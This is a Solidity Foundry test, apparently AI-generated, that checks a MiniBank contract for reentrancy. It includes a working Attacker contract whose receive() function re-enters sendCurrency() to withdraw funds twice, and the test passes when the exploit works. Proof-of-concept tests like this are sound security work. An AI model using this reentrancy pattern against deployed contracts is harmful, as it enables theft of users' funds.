// Generation Time: 64,97s
// Input Tokens: 3159
// Output Tokens: 443
// Reasoning Tokens: 2273


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal * 3 <= address(this).balance);

        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 3);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public victim;
    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    constructor(address victimAddress) {
        victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        
        victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        victim.sendCurrency();
        
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            victim.sendCurrency();
        }
    }
}
